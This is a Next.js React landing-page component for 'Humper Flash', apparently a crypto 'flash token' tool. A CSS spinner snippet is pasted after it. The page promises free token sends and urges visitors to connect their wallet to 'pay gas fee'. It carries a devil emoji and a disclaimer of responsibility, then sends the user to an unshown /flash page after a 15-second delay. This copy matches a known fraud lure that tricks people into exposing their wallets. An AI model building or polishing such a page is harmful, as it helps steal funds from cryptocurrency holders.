import { useState } from 'react';
import { useRouter } from 'next/router';

export default function Home() {
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const handleNavigate = () => {
    setIsLoading(true);
    setTimeout(() => {
      router.push('/flash');
    }, 15000); // 15-second delay
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center p-4">
      <h1 className="text-3xl font-bold mb-4">Humper Flash</h1>
      <p className="text-center mb-4">
        Humper Flash is a newly launched tool developed by The Axel Brothers to help Users send Token to Wallet for free😈. 
        Just connect your wallet so that you will be able to pay gas fee when sending transactions Enjoy💯
      </p>
      <p className="text-yellow-400 mb-6">
        ⚠️ This tool should be used responsibly and should not in any way be used to cause harm as we will not be responsible for any harm caused by this tool
      </p>
      <button
        onClick={handleNavigate}
        className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
        disabled={isLoading}
      >
        {isLoading ? <span className="spinner" /> : 'Flash Now⚡'}
      </button>
    </div>
  );
}

// Spinner CSS in styles/global.css
.spinner {
  border: 4px solid rgba(255, 255, 255, 0.3);
  border-left-color: #fff;
  border-radius: 50%;
  width: 24px;
  height: 24px;
  animation: spin 1s linear infinite;
  display: inline-block;
}